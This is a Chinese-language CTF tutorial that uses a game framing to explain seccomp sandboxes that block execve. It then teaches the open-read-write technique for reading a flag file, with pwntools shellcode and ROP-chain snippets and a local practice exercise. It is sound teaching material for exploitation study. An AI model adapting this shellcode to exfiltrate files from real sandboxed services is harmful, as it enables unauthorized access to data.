# 第 24 关 · 沙箱与 ORW：禁魔模式怎么通关

## 🎬 游戏开场

你终于打到最终 BOSS,正准备放大招 `system("/bin/sh")`,结果屏幕上弹出:

> **"禁魔领域:execve 系统调用已被封印。"**

这是 **seccomp 沙箱**——程序给自己套了个规则:"不许执行 execve"。而 `system` 的本质就是调用 `execve` 启动 `/bin/sh`,所以你的大招被废了。

游戏比喻:BOSS 开了"禁魔模式",你的终极技能(开 shell)被封。

但规则只禁了 execve——它没禁**读文件**。那我还要 shell 干嘛?我直接:

1. `open("flag")` —— 打开旗子文件
2. `read(fd, buf, size)` —— 读出来
3. `write(1, buf, size)` —— 打印到屏幕

三个"基础攻击"组合起来,旗子照样到手。这就是 **ORW(Open-Read-Write)**——不用 shell,直接读旗。

---

## 🧠 核心概念（游戏版）

### 1. 什么是 seccomp 沙箱?

**seccomp** 是 Linux 的一种安全机制,能限制程序能调用哪些**系统调用**(syscall)。CTF 题常用它禁掉 `execve`、`execveat`,防止玩家 get shell。

用 seccomp-tools 查看规则:

```bash
seccomp-tools dump ./vuln
```

输出类似:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004   ld arch
 ...
 0013: 0x15 0x00 0x01 0x0000003b   if nr != 0x3b (execve) → KILL
```

看到 `0x3b`(execve 的编号)被禁,就知道要用 ORW 了。

### 2. ORW 的两种实现

**方式一:ORW shellcode**

如果栈可执行(或有 RWX 段),直接写一段 shellcode:

```python
sc = shellcraft.amd64.linux.open('flag')      # 打开
sc += shellcraft.amd64.linux.read(3, buf, 0x40) # 读
sc += shellcraft.amd64.linux.write(1, buf, 0x40) # 输出
payload = asm(sc)
```

**方式二:ORW ROP 链**

更通用(NX 开启时):用 ROP 调用三个系统调用 gadget:

```python
rop = ROP(libc)
rop.open(b'/flag', 0)         # 或 syscall(2, ...)
rop.read(fd, buf, 0x100)
rop.write(1, buf, 0x100)
```

需要合适的 gadget(`syscall; ret` 或 `pop rax; ret` 等)和可写的内存放 flag 内容。

### 3. 关键难点

- **找 gadget**:`syscall` 指令的 gadget(设置 rax=系统调用号:2=open, 0=read, 1=write)。
- **文件描述符**:open 返回的文件描述符通常是 3(0/1/2 被占)。
- **flag 文件名**:可能是 `flag`、`/flag`、`flag.txt`,要先探测。
- **可写缓冲区**:读到哪里(bss 段常用)。

### 4. 沙箱题目的整体思路

```
1. checksec + seccomp-tools → 确认禁了什么
2. 如果有栈溢出 → 先泄露 libc/堆地址
3. execve 被禁 → 放弃 get shell,改 ORW
4. 构造 open/read/write 链 → 输出 flag
```

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 禁魔模式 | seccomp 沙箱 |
| 封印大招 | 禁止 execve 系统调用 |
| 基础攻击三连 | ORW(open/read/write) |

---

## 🎯 闯关任务:写一个 ORW shellcode

```python
from pwn import *
context.arch = 'amd64'
sc  = shellcraft.amd64.linux.open('flag')
sc += shellcraft.amd64.linux.read('rax', 'rsp', 0x40)  # rax此时是fd
sc += shellcraft.amd64.linux.write(1, 'rsp', 0x40)
print(disasm(asm(sc)))
```

在本地放一个 `flag` 文件,配合第 9 关的 shellcode 执行框架,尝试读出内容。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| seccomp | 禁止特定系统调用的沙箱 |
| 检测 | `seccomp-tools dump` |
| ORW | execve 被禁时用 open/read/write 直接读flag |
| 实现 | shellcode 或 ROP 链 |

---

## 🎬 下一关预告

**第 25 关 · 内核 PWN：管理员模式初探**

用户态的游戏玩腻了?下一关我们进入**内核世界**——那里是游戏的"管理员模式",权限更高,规则不同,漏洞更危险。

我们会认识内核里的"储物柜"(slab)、内核态的 UAF,以及怎么从普通玩家提权成 root(超级管理员)。这是基础篇的最后一关,也是通往进阶篇的桥梁。
